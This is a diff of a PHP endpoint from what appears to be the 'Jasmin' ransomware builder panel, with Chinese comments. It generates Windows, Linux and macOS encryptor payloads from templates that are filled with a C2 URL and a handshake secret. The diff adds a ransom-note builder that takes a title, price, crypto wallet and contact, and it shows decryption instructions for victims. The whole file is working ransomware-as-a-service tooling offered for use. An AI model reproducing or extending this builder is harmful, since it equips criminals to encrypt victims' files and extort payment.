@@ -1,74 +1,79 @@
 <?php
 /**
- * 载荷生成API — 根据平台生成对应加密器载荷
- * POST /generate.php  { platform: win|linux|macos, c2_url: ..., callback: ... }
+ * 载荷生成API — 支持自定义勒索信内容
  */
 require_once __DIR__ . '/includes/auth.php';
 require_once __DIR__ . '/includes/csrf.php';
 require_auth();
-
 header('Content-Type: application/json');
 
-if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
-    echo json_encode(['ok'=>false,'msg'=>'POST only']);
-    exit;
-}
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') { echo json_encode(['ok'=>false,'msg'=>'POST only']); exit; }
 
 $platform = $_POST['platform'] ?? '';
 $c2_url   = trim($_POST['c2_url'] ?? '');
 $secret   = trim($_POST['secret'] ?? 'jasmin@123');
 
+// 勒索信参数
+$ransom = [
+    'title'   => $_POST['ransom_title'] ?? 'YOUR FILES HAVE BEEN ENCRYPTED',
+    'contact' => $_POST['ransom_contact'] ?? '',
+    'body'    => $_POST['ransom_body'] ?? '',
+    'price'   => $_POST['ransom_price'] ?? '',
+    'wallet'  => $_POST['ransom_wallet'] ?? '',
+];
+
 $valid = ['win','linux','macos'];
-if (!in_array($platform, $valid)) {
-    echo json_encode(['ok'=>false,'msg'=>'Invalid platform']);
-    exit;
-}
+if (!in_array($platform, $valid)) { echo json_encode(['ok'=>false,'msg'=>'无效平台']); exit; }
 
 $out_dir = __DIR__ . '/payloads';
 if (!is_dir($out_dir)) mkdir($out_dir, 0750, true);
-
 $ts = date('Ymd_His');
-$token = bin2hex(random_bytes(4));
+$tok = bin2hex(random_bytes(4));
 
-if ($platform === 'linux') {
-    $result = generate_linux($c2_url, $secret, $out_dir, $ts, $token);
-} elseif ($platform === 'macos') {
-    $result = generate_macos($c2_url, $secret, $out_dir, $ts, $token);
-} else {
-    $result = generate_windows($c2_url, $secret, $out_dir, $ts, $token);
+$tpl_map = ['win'=>'win_payload.tpl','linux'=>'linux_payload.tpl','macos'=>'macos_payload.tpl'];
+$ext_map = ['win'=>'.cs','linux'=>'.py','macos'=>'.py'];
+$tpl_path = __DIR__ . '/templates/' . $tpl_map[$platform];
+
+if (!file_exists($tpl_path)) { echo json_encode(['ok'=>false,'msg'=>'模板文件缺失']); exit; }
+
+$tpl = file_get_contents($tpl_path);
+$tpl = str_replace('{{C2_URL}}', $c2_url, $tpl);
+$tpl = str_replace('{{HANDSHAKE}}', $secret, $tpl);
+
+// 构建勒索信文本
+$note = build_ransom_note($ransom, $platform);
+$tpl = str_replace('{{RANSOM_NOTE}}', addcslashes($note, "'\"\\"), $tpl);
+// 也替换独立字段
+foreach ($ransom as $k=>$v) {
+    $tpl = str_replace('{{RANSOM_'.strtoupper($k).'}}', addcslashes($v, "'\"\\"), $tpl);
 }
 
-echo json_encode($result);
+$name = "jasmin_{$platform}_{$ts}_{$tok}" . $ext_map[$platform];
+$path = "{$out_dir}/{$name}";
+file_put_contents($path, $tpl);
+if ($platform !== 'win') chmod($path, 0750);
+echo json_encode(['ok'=>true,'file'=>$name,'platform'=>$platform,'size'=>filesize($path)]);
 exit;
 
-function generate_linux($c2, $secret, $dir, $ts, $tok) {
-    $name = "jasmin_linux_{$ts}_{$tok}.py";
-    $path = "{$dir}/{$name}";
-    $tpl = file_get_contents(__DIR__ . '/templates/linux_payload.tpl');
-    $tpl = str_replace('{{C2_URL}}', $c2, $tpl);
-    $tpl = str_replace('{{HANDSHAKE}}', $secret, $tpl);
-    file_put_contents($path, $tpl);
-    chmod($path, 0750);
-    return ['ok'=>true,'file'=>$name,'platform'=>'linux','size'=>filesize($path)];
-}
-
-function generate_macos($c2, $secret, $dir, $ts, $tok) {
-    $name = "jasmin_macos_{$ts}_{$tok}.py";
-    $path = "{$dir}/{$name}";
-    $tpl = file_get_contents(__DIR__ . '/templates/macos_payload.tpl');
-    $tpl = str_replace('{{C2_URL}}', $c2, $tpl);
-    $tpl = str_replace('{{HANDSHAKE}}', $secret, $tpl);
-    file_put_contents($path, $tpl);
-    chmod($path, 0750);
-    return ['ok'=>true,'file'=>$name,'platform'=>'macos','size'=>filesize($path)];
-}
-
-function generate_windows($c2, $secret, $dir, $ts, $tok) {
-    $name = "jasmin_win_{$ts}_{$tok}.cs";
-    $path = "{$dir}/{$name}";
-    $tpl = file_get_contents(__DIR__ . '/templates/win_payload.tpl');
-    $tpl = str_replace('{{C2_URL}}', $c2, $tpl);
-    $tpl = str_replace('{{HANDSHAKE}}', $secret, $tpl);
-    file_put_contents($path, $tpl);
-    return ['ok'=>true,'file'=>$name,'platform'=>'windows','size'=>filesize($path)];
+function build_ransom_note($r, $plat) {
+    $t = $r['title'];
+    $b = $r['body'];
+    $c = $r['contact'];
+    $p = $r['price'];
+    $w = $r['wallet'];
+    $dec = ($plat === 'win')
+        ? "运行 Jasmin_Decryptor.exe → 选择.pem私钥 → Decrypt"
+        : "pip3 install cryptography && python3 jasmin_decrypt.py private_key.pem";
+    $n = "╔══════════════════════════════════════════╗\n";
+    $n.= "║  {$t}\n";
+    $n.= "║  你的文件已被加密\n";
+    $n.= "╚══════════════════════════════════════════╝\n\n";
+    $n.= "系统ID: {sid}\n\n";
+    $n.= "{$b}\n\n";
+    if ($p) $n.= "💰 赎金: {$p}\n";
+    if ($w) $n.= "💳 支付地址: {$w}\n";
+    if ($c) $n.= "📧 {$c}\n";
+    $n.= "\n🔓 解密方法:\n{$dec}\n";
+    $n.= "\n✅ SHA-256 校验确保文件100%还原\n";
+    return $n;
 }
